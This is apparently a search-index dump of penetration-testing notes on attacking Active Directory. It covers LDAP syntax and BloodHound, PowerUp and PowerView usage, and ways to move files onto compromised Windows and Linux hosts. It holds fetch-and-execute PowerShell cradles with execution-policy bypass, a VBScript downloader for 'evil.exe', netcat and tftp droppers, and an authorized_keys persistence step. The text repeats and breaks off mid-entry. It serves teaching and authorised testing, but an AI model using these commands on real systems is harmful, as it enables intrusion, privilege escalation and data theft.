Directory. Entries # An LDAP entry is a collection of information about an entity (like a user or a computer). Each entry consists of three primary components: a distinguished name (DN) a collection of attributes a collection of object classes. DNs and RDNs # An entry\u2019s distinguished name, often referred to as a DN, uniquely identifies that entry and its position in the directory information tree (DIT) hierarchy. The DN of an LDAP entry is much like the path to a file on a filesystem. An LDAP DN is comprised of zero or more elements called relative distinguished names, or RDNs. Each RDN is comprised of one or more (usually just one) attribute-value pairs. For example, \"uid=john.doe\" represents an RDN comprised of an attribute named \"uid\" with a value of \"john.doe\". If an RDN has multiple attribute-value pairs, they are separated by plus signs, like \"givenName=John+sn=Doe\". The special distinguished name comprised of zero RDNs (and therefore has a string representation that is just an empty string) is sometimes called the \u201cnull DN\u201d and references a special type of entry called the root DSE which provides information about the content and capabilities of the directory server. For DNs with multiple RDNs, the order of the RDNs specifies the position of the associated entry in the DIT. RDNs are separated by commas, and each RDN in a DN represents a level in the hierarchy in descending order (i.e., moving closer to the root of the tree, which is called the naming context). That is, if you remove an RDN from a DN, you get the DN of the entry considered the parent of the former DN. For example, the DN \"uid=john.doe,ou=People,dc=example,dc=com\" has four RDNs, with the parent DN being \"ou=People,dc=example,dc=com\". A Distinguished Name (DN) should be read from left to right. The RDNs more to the left represent the higher branches of a tree. The RDN to the far right represent the trunk of the tree. The Distinguished Name of an active directory : cn=Philip L,cn=users,dc=evilcorp,dc=local This is a Relative Distinguished Name: dc=local Attributes # Attributes hold the data for an entry. Each attribute has an attribute type, zero or more attribute options, and a set of values that comprise the actual data. Attribute types are schema elements that specify how attributes should be treated by LDAP clients and servers. All attribute types must have an object identifier (OID) and zero or more names that can be used to reference attributes of that type. They must also have an attribute syntax, which specifies the type of data that can be stored in attributes of that type, and a set of matching rules, which indicate how comparisons should be performed against values of attributes of that type. Attribute types may also indicate whether an attribute is allowed to have multiple values in the same entry, and whether the attribute is intended for holding user data (a user attribute) or is used for the operation of the server (an operational attribute). Operational attributes are typically used for configuration and/or state information. Attribute options are not used all that often, but may be used to provide some metadata about an attribute. For example, attribute options may be used to provide different versions of a value in different languages. Examples of attribute types are: OctetString , Integer8 , Integer , DirectoryString , Boolean , DN , OID , Sid , GeneralizedTime . Object Classes # Object classes are schema elements that specify collections of attribute types that may be related to a particular type of object, process, or other entity. Every entry has a structural object class, which indicates what kind of object an entry represents (e.g., whether it is information about a person, a group, a device, a service, etc.), and may also have zero or more auxiliary object classes that suggest additional characteristics for that entry. Like attribute types, object classes must have an object identifier, but they may also have zero or more names. Object classes may also list a set of required attribute types (so that any entry with that object class must also include those attributes) and/or a set of optional attribute types (so that any entry with that object class may optionally include those attributes). Object Identifiers (OIDs) # An object identifier (OID) is a string that is used to uniquely identify various elements in the LDAP protocol, as well as in other areas throughout computing. OIDs consist of a sequence of numbers separated by periods (e.g., \"1.2.840.113556.1.4.473\" is the OID that represents the server-side sort request control). In LDAP, OIDs are used to identify things like schema elements (like attribute types, object classes, syntaxes, matching rules, etc.), controls, and extended requests and responses. In the case of schema elements, there may also be user-friendly names that can be used in place of OIDs. When you look at the Active Directory with ADExplorer it will automatically translate the OIDs to more userfriendly-names, so we won't have to lookup each OID to understand what it refers to. Search Filters # Search filters are used to define criteria for identifying entries that contain certain kinds of information. There are a number of different types of search filters: Presence filters may be used to identify entries in which a specified attribute has at least one value. Equality filters may be used to identify entries in which a specified attribute has a particular value. Substring filters may be used to identify entries in which a specified attribute has at least one value that matches a given substring. Greater-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered greater than or equal to a given value. Less-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered less than or equal to a given value. Approximate match filters may be used to identify entries in which a specified attribute has a value that is approximately equal to a given value. Note that there is no official definition of \u201capproximately equal to\u201d, and therefore this behavior may vary from one server to another. Some servers use a \u201csounds like\u201d algorithm like one of the Soundex or Metaphone variants. Extensible match filters may be used to provide more advanced types of matching, including the use of custom matching rules and/or matching attributes within an entry\u2019s DN. AND filters may be used to identify entries that match all of the filters encapsulated inside the AND. OR filters may be used to identify entries that match at least one of the filters encapsulated inside the OR. NOT filters may be used to negate the result of the encapsulated filter (i.e., if a filter matches an entry, then a NOT filter encapsulating that matching filter will not match the entry, and if a filter does not match an entry, then a NOT filter encapsulating that non-matching filter will match the entry). The logic used to perform the matching is encapsulated in matching rules, which are specified in attribute type definitions. Different matching rules may use different logic for making the determination. For example, the caseIgnoreMatch matching rule will ignore differences in capitalization when comparing two strings, while the caseExactMatch matching rule will not. Many matching rules are specific to certain data types (e.g., the distinguishedNameMatch matching rule expects to operate only on values that are DNs and can do things like ignore insignificant spaces between DN and RDN components, ignore differences in the order of elements in a multivalued RDN, etc.). Search Base DNs and Scopes # All search requests include a base DN element, which specifies the portion of the DIT in which to look for matching entries, and a scope, which specifies how much of that subtree should be considered. The defined search scopes include: The baseObject scope (often referred to as just \u201cbase\u201d) indicates that only the entry specified by the search base DN should be considered. The singleLevel scope (often referred to as \u201cone\u201d or \u201conelevel\u201d) indicates that only entries immediately below the search base DN (but not the base entry itself) should be considered. The wholeSubtree scope (often referred to as \u201csub\u201d) indicates that the entry specified as the search base DN and all entries below it (to any depth) should be considered. The subordinateSubtree scope indicates that all entries below the search base DN (to any depth), but not the search base entry itself, should be considered. Controls # A control is a piece of information that can be included in an LDAP request or response to provide additional information about that request or response, or to change the way that it should be interpreted by the server (in the case of a request) or client (in the case of a response). For example, the server-side sort request control can be included in a search request to indicate that the server should sort the matching entries in a particular way before sending them to the client. LDAP controls have three elements: An object identifier (OID) that uniquely identifies the type of control. This is a required element. A criticality. This is a flag that indicates how the server should behave if it does not recognize a provided request control, or if it cannot support the control in the context in which it was requested. A criticality of \u201ctrue\u201d indicates that the control is a critical part of the request, and that the server should reject the request if it cannot support the control. A criticality of \u201cfalse\u201d indicates that the control is more a \u201cnice to have\u201d part of the request, and that if the server cannot support the control then it should go ahead and process the operation as if the control had not been included. The criticality does not come into play if the server does support the control within the context of the request. An optional value, which can provide additional information for use in processing the control. For example, for a server-side sort request control, the control value should specify the desired sort order. The encoding for a control varies based on the type of control. LDAPSEARCH Syntax # In order to authenticate to the LDAP server we need a username and password. The username is entered in the form of a Dinstingushed Name (DN) since that is a unique identifier. In the LDAP world this is called \"bind dn\". For example: -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" . The Search Base is specified with the -b flag in ldapsearch. For example: -b \"dc=evilcorp,dc=local\" . ldapsearch will automatically default to the scope subTree, and the filter objectClass=* . This is the basic syntax of a ldapsearch query: usage: ldapsearch [options] [filter [attributes...]] . So first the options, then the filter. ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(userPassword=*)\" In order to be able to include fun operators like this: (Operator(filter)(filter)(filter)...) With Operator being & (AND), | (OR) and ! (NOT). ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(userPassword=*)(objectClass=*))\" ldapsearch -h <ip-address of dc> -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\"","title":"LDAP Syntax"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#directory-servers","text":"A directory server (more technically referred to as a Directory Server Agent, a Directory System Agent, or a DSA) is a type of network database that stores information represented as trees of entries. This is different from a relational database, which uses tables comprised of rows and columns, so directory servers may be considered a type of NoSQL database (even though directory servers have been around a lot longer than the term NoSQL has). While virtually all directory servers support LDAP, some servers offer support for additional protocols that can be used to interact with the data. Some of these protocols include X.500 (the original Directory Access Protocol, for which LDAP is a much more lightweight version), naming service protocols like DNS and NIS, HTTP-based protocols like DSML and SCIM, and proprietary protocols like Novell\u2019s NDS. The Directory Server interesting to us is of course Microsoft Active Directory.","title":"Directory Servers"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#entries","text":"An LDAP entry is a collection of information about an entity (like a user or a computer). Each entry consists of three primary components: a distinguished name (DN) a collection of attributes a collection of object classes.","title":"Entries"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#dns-and-rdns","text":"An entry\u2019s distinguished name, often referred to as a DN, uniquely identifies that entry and its position in the directory information tree (DIT) hierarchy. The DN of an LDAP entry is much like the path to a file on a filesystem. An LDAP DN is comprised of zero or more elements called relative distinguished names, or RDNs. Each RDN is comprised of one or more (usually just one) attribute-value pairs. For example, \"uid=john.doe\" represents an RDN comprised of an attribute named \"uid\" with a value of \"john.doe\". If an RDN has multiple attribute-value pairs, they are separated by plus signs, like \"givenName=John+sn=Doe\". The special distinguished name comprised of zero RDNs (and therefore has a string representation that is just an empty string) is sometimes called the \u201cnull DN\u201d and references a special type of entry called the root DSE which provides information about the content and capabilities of the directory server. For DNs with multiple RDNs, the order of the RDNs specifies the position of the associated entry in the DIT. RDNs are separated by commas, and each RDN in a DN represents a level in the hierarchy in descending order (i.e., moving closer to the root of the tree, which is called the naming context). That is, if you remove an RDN from a DN, you get the DN of the entry considered the parent of the former DN. For example, the DN \"uid=john.doe,ou=People,dc=example,dc=com\" has four RDNs, with the parent DN being \"ou=People,dc=example,dc=com\". A Distinguished Name (DN) should be read from left to right. The RDNs more to the left represent the higher branches of a tree. The RDN to the far right represent the trunk of the tree. The Distinguished Name of an active directory : cn=Philip L,cn=users,dc=evilcorp,dc=local This is a Relative Distinguished Name: dc=local","title":"DNs and RDNs"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#attributes","text":"Attributes hold the data for an entry. Each attribute has an attribute type, zero or more attribute options, and a set of values that comprise the actual data. Attribute types are schema elements that specify how attributes should be treated by LDAP clients and servers. All attribute types must have an object identifier (OID) and zero or more names that can be used to reference attributes of that type. They must also have an attribute syntax, which specifies the type of data that can be stored in attributes of that type, and a set of matching rules, which indicate how comparisons should be performed against values of attributes of that type. Attribute types may also indicate whether an attribute is allowed to have multiple values in the same entry, and whether the attribute is intended for holding user data (a user attribute) or is used for the operation of the server (an operational attribute). Operational attributes are typically used for configuration and/or state information. Attribute options are not used all that often, but may be used to provide some metadata about an attribute. For example, attribute options may be used to provide different versions of a value in different languages. Examples of attribute types are: OctetString , Integer8 , Integer , DirectoryString , Boolean , DN , OID , Sid , GeneralizedTime .","title":"Attributes"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#object-classes","text":"Object classes are schema elements that specify collections of attribute types that may be related to a particular type of object, process, or other entity. Every entry has a structural object class, which indicates what kind of object an entry represents (e.g., whether it is information about a person, a group, a device, a service, etc.), and may also have zero or more auxiliary object classes that suggest additional characteristics for that entry. Like attribute types, object classes must have an object identifier, but they may also have zero or more names. Object classes may also list a set of required attribute types (so that any entry with that object class must also include those attributes) and/or a set of optional attribute types (so that any entry with that object class may optionally include those attributes).","title":"Object Classes"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#object-identifiers-oids","text":"An object identifier (OID) is a string that is used to uniquely identify various elements in the LDAP protocol, as well as in other areas throughout computing. OIDs consist of a sequence of numbers separated by periods (e.g., \"1.2.840.113556.1.4.473\" is the OID that represents the server-side sort request control). In LDAP, OIDs are used to identify things like schema elements (like attribute types, object classes, syntaxes, matching rules, etc.), controls, and extended requests and responses. In the case of schema elements, there may also be user-friendly names that can be used in place of OIDs. When you look at the Active Directory with ADExplorer it will automatically translate the OIDs to more userfriendly-names, so we won't have to lookup each OID to understand what it refers to.","title":"Object Identifiers (OIDs)"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#search-filters","text":"Search filters are used to define criteria for identifying entries that contain certain kinds of information. There are a number of different types of search filters: Presence filters may be used to identify entries in which a specified attribute has at least one value. Equality filters may be used to identify entries in which a specified attribute has a particular value. Substring filters may be used to identify entries in which a specified attribute has at least one value that matches a given substring. Greater-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered greater than or equal to a given value. Less-or-equal filters may be used to identify entries in which a specified attribute has at least one value that is considered less than or equal to a given value. Approximate match filters may be used to identify entries in which a specified attribute has a value that is approximately equal to a given value. Note that there is no official definition of \u201capproximately equal to\u201d, and therefore this behavior may vary from one server to another. Some servers use a \u201csounds like\u201d algorithm like one of the Soundex or Metaphone variants. Extensible match filters may be used to provide more advanced types of matching, including the use of custom matching rules and/or matching attributes within an entry\u2019s DN. AND filters may be used to identify entries that match all of the filters encapsulated inside the AND. OR filters may be used to identify entries that match at least one of the filters encapsulated inside the OR. NOT filters may be used to negate the result of the encapsulated filter (i.e., if a filter matches an entry, then a NOT filter encapsulating that matching filter will not match the entry, and if a filter does not match an entry, then a NOT filter encapsulating that non-matching filter will match the entry). The logic used to perform the matching is encapsulated in matching rules, which are specified in attribute type definitions. Different matching rules may use different logic for making the determination. For example, the caseIgnoreMatch matching rule will ignore differences in capitalization when comparing two strings, while the caseExactMatch matching rule will not. Many matching rules are specific to certain data types (e.g., the distinguishedNameMatch matching rule expects to operate only on values that are DNs and can do things like ignore insignificant spaces between DN and RDN components, ignore differences in the order of elements in a multivalued RDN, etc.).","title":"Search Filters"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#search-base-dns-and-scopes","text":"All search requests include a base DN element, which specifies the portion of the DIT in which to look for matching entries, and a scope, which specifies how much of that subtree should be considered. The defined search scopes include: The baseObject scope (often referred to as just \u201cbase\u201d) indicates that only the entry specified by the search base DN should be considered. The singleLevel scope (often referred to as \u201cone\u201d or \u201conelevel\u201d) indicates that only entries immediately below the search base DN (but not the base entry itself) should be considered. The wholeSubtree scope (often referred to as \u201csub\u201d) indicates that the entry specified as the search base DN and all entries below it (to any depth) should be considered. The subordinateSubtree scope indicates that all entries below the search base DN (to any depth), but not the search base entry itself, should be considered.","title":"Search Base DNs and Scopes"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#controls","text":"A control is a piece of information that can be included in an LDAP request or response to provide additional information about that request or response, or to change the way that it should be interpreted by the server (in the case of a request) or client (in the case of a response). For example, the server-side sort request control can be included in a search request to indicate that the server should sort the matching entries in a particular way before sending them to the client. LDAP controls have three elements: An object identifier (OID) that uniquely identifies the type of control. This is a required element. A criticality. This is a flag that indicates how the server should behave if it does not recognize a provided request control, or if it cannot support the control in the context in which it was requested. A criticality of \u201ctrue\u201d indicates that the control is a critical part of the request, and that the server should reject the request if it cannot support the control. A criticality of \u201cfalse\u201d indicates that the control is more a \u201cnice to have\u201d part of the request, and that if the server cannot support the control then it should go ahead and process the operation as if the control had not been included. The criticality does not come into play if the server does support the control within the context of the request. An optional value, which can provide additional information for use in processing the control. For example, for a server-side sort request control, the control value should specify the desired sort order. The encoding for a control varies based on the type of control.","title":"Controls"},{"location":"attacking_active_directory_domain/good_to_know/ldap_syntax/#ldapsearch-syntax","text":"In order to authenticate to the LDAP server we need a username and password. The username is entered in the form of a Dinstingushed Name (DN) since that is a unique identifier. In the LDAP world this is called \"bind dn\". For example: -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" . The Search Base is specified with the -b flag in ldapsearch. For example: -b \"dc=evilcorp,dc=local\" . ldapsearch will automatically default to the scope subTree, and the filter objectClass=* . This is the basic syntax of a ldapsearch query: usage: ldapsearch [options] [filter [attributes...]] . So first the options, then the filter. ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(userPassword=*)\" In order to be able to include fun operators like this: (Operator(filter)(filter)(filter)...) With Operator being & (AND), | (OR) and ! (NOT). ldapsearch -h evilcorp.local -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\" \"(|(userPassword=*)(objectClass=*))\" ldapsearch -h <ip-address of dc> -w SecretPassword -b \"dc=evilcorp,dc=local\" -D \"cn=Philip L,cn=users,dc=evilcorp,dc=local\"","title":"LDAPSEARCH Syntax"},{"location":"attacking_active_directory_domain/good_to_know/neo4j_and_cypher/","text":"Cypher / Interesting queries # Get shortest path from any user that is not admin, to Domain admins group MATCH (n:User {admincount: false}), (m:Group {name: \"DOMAIN ADMINS@domain.local\"}), p=shortestPath((n)-[*1..]->(m)) RETURN p","title":"Neo4J and Cypher"},{"location":"attacking_active_directory_domain/good_to_know/neo4j_and_cypher/#cypher-interesting-queries","text":"Get shortest path from any user that is not admin, to Domain admins group MATCH (n:User {admincount: false}), (m:Group {name: \"DOMAIN ADMINS@domain.local\"}), p=shortestPath((n)-[*1..]->(m)) RETURN p","title":"Cypher / Interesting queries"},{"location":"attacking_active_directory_domain/good_to_know/tools/","text":"Tools # Bloodhound # Running SharpHound # Using bloodhound requires two things (1) Extract the data and (2) Analyze the data. Extracting the data can be done with the powershell-script SharpHound.ps1 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Or you can download the module and then run: powershell -Exec Bypass import-module .\\Sharphound.ps1 invoke-bloodhound invoke-bloodhound -CollectionMethod all In order to transfer the resulting zip-file from the windows computer to your linux-machine where you are running bloodhound see Transfering Files . Running Bloodhound # If you have the kali-repo you can install bloodhound like this: sudo apt-get install bloodhound sudo neo4j console bloodhound The default username/password for neo4j is neo4j/neo4j. ps aux | grep neo4j sudo kill XXXX References: Understanding Bloodhound output: https://wald0.com/?p=112 PowerUp # powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'); Invoke-AllChecks\" PowerView # powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');\" ADExplorer # It can be downloaded from here: https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer https://download.sysinternals.com/files/AdExplorer.zip","title":"Tools"},{"location":"attacking_active_directory_domain/good_to_know/tools/#tools","text":"","title":"Tools"},{"location":"attacking_active_directory_domain/good_to_know/tools/#bloodhound","text":"","title":"Bloodhound"},{"location":"attacking_active_directory_domain/good_to_know/tools/#running-sharphound","text":"Using bloodhound requires two things (1) Extract the data and (2) Analyze the data. Extracting the data can be done with the powershell-script SharpHound.ps1 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Or you can download the module and then run: powershell -Exec Bypass import-module .\\Sharphound.ps1 invoke-bloodhound invoke-bloodhound -CollectionMethod all In order to transfer the resulting zip-file from the windows computer to your linux-machine where you are running bloodhound see Transfering Files .","title":"Running SharpHound"},{"location":"attacking_active_directory_domain/good_to_know/tools/#running-bloodhound","text":"If you have the kali-repo you can install bloodhound like this: sudo apt-get install bloodhound sudo neo4j console bloodhound The default username/password for neo4j is neo4j/neo4j. ps aux | grep neo4j sudo kill XXXX References: Understanding Bloodhound output: https://wald0.com/?p=112","title":"Running Bloodhound"},{"location":"attacking_active_directory_domain/good_to_know/tools/#powerup","text":"powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'); Invoke-AllChecks\"","title":"PowerUp"},{"location":"attacking_active_directory_domain/good_to_know/tools/#powerview","text":"powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');\"","title":"PowerView"},{"location":"attacking_active_directory_domain/good_to_know/tools/#adexplorer","text":"It can be downloaded from here: https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer https://download.sysinternals.com/files/AdExplorer.zip","title":"ADExplorer"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/","text":"Transferring Files from Windows to Linux # Scenario: you want to transfer files from a Windows Client desktop to your Linux Pentest machine. SMB Client # Using Impacket: python smbclient.py evilcorp.local/username@HOSTNAME.evilcorp.local shares use secretshare get file.txt SMB Server # You can set up a SMB server on your pentest machine, and then just access the share from your Windows machine and upload and download files. This can be done either over the customers internal network, or by simply connecting your pentest machine to the windows machine with an ethernet cable. In many modern AD it is not possible to mount a smbshare without authenticating, so you need to start the smbserver with the flags -username and -password . You will likely also need the -smb2support flag, because otherwise it will default to smb1, and that is often not supported. With impacket this can be done like this: sudo python smbserver.py -smb2support -username pelle -password mysecretpassword test /tmp On your windows client your wither just ue the file explorer and go to \\\\169.254.86.128\\test , or you can mount it like this: use net Z: \\\\169.254.86.128\\test /user:pelle net user Z: /delete To and from client to server SMB / RDP # If you are using RDP on windows you can just attach a directory to share from when you start your RDP session. xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp Now you can simply open the Computer part in your Explorer window, and you should see the disk fildel . In that share you can share documents between your computer and the RDP server. From client to server SMB / RDP # A simple way is simply to to connect to your server with xfreerdp and then open up the fil-browser in your linux machine, and copy the file. Then go to your windows server and simply paste the file. For me it only works in that direction, and not the reverse. From X server to Windows (Bitsadmin) # Downloading a file with CMD can be done with bitsadmin. bitsadmin /transfer aaa http://192.168.66.87/apaa.txt c:\\Users\\temp\\aaa.txt FTP # Most windows machines have a ftp-client included. But we can't use it interactively since that most likely would kill our shell. So we have get around that. We can however run commands from a file. So what we want to do is to echo out the commands into a textfile. And then use that as our input to the ftp-client. Let me demonstrate. On the compromised machine we echo out the following commands into a file echo open 192.168.1.101 21> ftp.txt echo USER asshat>> ftp.txt echo mysecretpassword>> ftp.txt echo bin>> ftp.txt echo GET wget.exe>> ftp.txt echo bye>> ftp.txt Then run this command to connect to the ftp ftp -v -n -s:ftp.txt Of course you need to have a ftp-server configured with the user asshat and the password to mysecretpassword. TFTP # Works by default on: Windows XP Windows 2003 A TFTP client is installed by default on windows machines up to Windows XP and Windows 2003. What is good about TFTP is that you can use it non-interactively. Which means less risk of losing your shell. Kali has a TFTP server build in. You can server up some files with it like this atftpd --daemon --port 69 /tftp /etc/init.d/atftpd restart Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening. You can see it running like this netstat -a -p UDP | grep udp So now you can upload and download whatever from the windows-machine like this tftp -i 192.160.1.101 GET wget.exe If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way. tftp 192.160.1.101 GET test.txt I usually put all files I want to make available in /srv/tftp If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this: grep 192.168.1.101 /var/log/syslog VBScript # Here is a good script to make a wget-clone in VB. If it doesn't work try piping it through unix2dos before copying it. echo strUrl = WScript.Arguments.Item(0) > wget.vbs echo StrFile = WScript.Arguments.Item(1) >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs echo Err.Clear >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set http = CreateObject(\"WinHttp.WinHttpRequest.5.1\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"WinHttp.WinHttpRequest\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"MSXML2.ServerXMLHTTP\") >> wget.vbs echo If http Is Nothing Then Set http = CreateObject(\"Microsoft.XMLHTTP\") >> wget.vbs echo http.Open \"GET\",strURL,False >> wget.vbs echo http.Send >> wget.vbs echo varByteArray = http.ResponseBody >> wget.vbs echo Set http = Nothing >> wget.vbs echo Set fs = CreateObject(\"Scripting.FileSystemObject\") >> wget.vbs echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs echo strData = \"\" >> wget.vbs echo strBuffer = \"\" >> wget.vbs echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs echo Next >> wget.vbs echo ts.Close >> wget.vbs You then execute the script like this: cscript wget.vbs http://192.168.10.5/evil.exe evil.exe PowerShell # This is how we can download a file using PowerShell. Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script: echo $storageDir = $pwd > wget.ps1 echo $webclient = New-Object System.Net.WebClient >>wget.ps1 echo $url = \"http://192.168.1.101/file.exe\" >>wget.ps1 echo $file = \"output-file.exe\" >>wget.ps1 echo $webclient.DownloadFile($url,$file) >>wget.ps1 Now we invoke it with this crazy syntax: powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1 Debug.exe # This is a crazy technique that works on windows 32 bit machines. Basically the idea is to use the debug.exe program. It is used to inspect binaries, like a debugger. But it can also rebuild them from hex. So the idea is that we take a binaries, like netcat . And then disassemble it into hex, paste it into a file on the compromised machine, and then assemble it with debug.exe . Debug.exe can only assemble 64 kb. So we need to use files smaller than that. We can use upx to compress it even more. So let's do that: upx -9 nc.exe Now it only weights 29 kb. Perfect. So now let's disassemble it: wine exe2bat.exe nc.exe nc.txt Now we just copy-past the text into our windows-shell. And it will automatically create a file called nc.exe Transfering files Windows to linux # smb-client # If you only have a hash of a user which is Transferring Files on Linux # Set Up a Simple Python Webserver # For the examples using curl and wget we need to download from a web-server. This is an easy way to set up a web-server. This command will make the entire folder, from where you issue the command, available on port 9999. python -m SimpleHTTPServer 9999 Wget # You can download files using wget like this: wget 192.168.1.102:9999/file.txt Curl # curl -O http://192.168.0.101/file.txt Netcat # Another easy way to transfer files is by using netcat. If you can't have an interactive shell it might be risky to start listening on a port, since it could be that the attacking-machine is unable to connect. So you are left hanging and can't do ctr-c because that will kill your session. So instead you can connect from the target machine like this. On attacking machine: nc -lvp 4444 < file On target machine: nc 192.168.1.102 4444 > file You can of course also do it the risky way, the other way around: So on the victim-machine we run nc like this: nc -lvp 3333 > enum.sh And on the attacking machine we send the file like this: nc 192.168.1.103 < enum.sh I have sometimes received this error: This is nc from the netcat-openbsd package. An alternative nc is available I have just run this command instead: nc -l 1234 > file.sh Socat # Server receiving file: server$ socat -u TCP-LISTEN:9876,reuseaddr OPEN:out.txt,creat && cat out.txt client$ socat -u FILE:test.txt TCP:127.0.0.1:9876 Server sending file: server$ socat -u FILE:test.dat TCP-LISTEN:9876,reuseaddr client$ socat -u TCP:127.0.0.1:9876 OPEN:out.dat,creat With php # echo \"<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>\" > down2.php Ftp # If you have access to a ftp-client to can of course just use that. Remember, if you are uploading binaries you must use binary mode, otherwise the binary will become corrupted!!! Tftp # On some rare machine we do not have access to nc and wget , or curl . But we might have access to tftp . Some versions of tftp are run interactively, like this: $ tftp 192.168.0.101 tftp> get myfile.txt If we can't run it interactively, for whatever reason, we can do this trick: tftp 191.168.0.101 <<< \"get shell5555.php shell5555.php\" SSH - SCP # If you manage to upload a reverse-shell and get access to the machine you might be able to enter using ssh. Which might give you a better shell and more stability, and all the other features of SSH. Like transferring files. So, in the /home/user directory you can find the hidden .ssh files by typing ls -la . Then you need to do two things. Create a new keypair You do that with: ssh-keygen -t rsa -C \"your_email@example.com\" then you enter a name for the key. Enter file in which to save the key (/root/.ssh/id_rsa): nameOfMyKey Enter passphrase (empty for no passphrase): Enter same passphrase again: This will create two files, one called nameOfMyKey and another called nameOfMyKey_pub . The one with the _pub is of course your public key. And the other key is your private. Add your public key to authorized_keys. Now you copy the content of nameOfMyKey_pub . On the compromised machine you go to ~/.ssh and then run add the public key to the file authorized_keys. Like this echo \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQqlhJKYtL/r9655iwp5TiUM9Khp2DJtsJVW3t5qU765wR5Ni+ALEZYwqxHPNYS/kZ4Vdv...\" > authorized_keys Log in. Now you should be all set to log in using your private key. Like this ssh -i nameOfMyKey kim@192.168.1.103 SCP # Now we can copy files to a machine using scp # Copy a file: scp /path/to/source/file.ext username@192.168.1.101:/path/to/destination/file.ext # Copy a directory: scp -r /path/to/source/dir username@192.168.1.101:/path/to/destination","title":"Transferring Files"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#transferring-files-from-windows-to-linux","text":"Scenario: you want to transfer files from a Windows Client desktop to your Linux Pentest machine.","title":"Transferring Files from Windows to Linux"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#smb-client","text":"Using Impacket: python smbclient.py evilcorp.local/username@HOSTNAME.evilcorp.local shares use secretshare get file.txt","title":"SMB Client"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#smb-server","text":"You can set up a SMB server on your pentest machine, and then just access the share from your Windows machine and upload and download files. This can be done either over the customers internal network, or by simply connecting your pentest machine to the windows machine with an ethernet cable. In many modern AD it is not possible to mount a smbshare without authenticating, so you need to start the smbserver with the flags -username and -password . You will likely also need the -smb2support flag, because otherwise it will default to smb1, and that is often not supported. With impacket this can be done like this: sudo python smbserver.py -smb2support -username pelle -password mysecretpassword test /tmp On your windows client your wither just ue the file explorer and go to \\\\169.254.86.128\\test , or you can mount it like this: use net Z: \\\\169.254.86.128\\test /user:pelle net user Z: /delete","title":"SMB Server"},{"location":"attacking_active_directory_domain/good_to_know/transferring_files/#to-and-from-client-to-server-smb-rdp","text":"If you are using RDP on windows you can just attach a directory to share from when you start your RDP session. xfreerdp /u:MYUSERNAME /v:10.10.10.1111 /drive:fildel,/home/temp/tmp Now you can simply open the Computer part in your Explorer window, and you should see the disk fildel . In that share you can share documents between your computer and the RDP server.","title":"To and from client to server SMB / 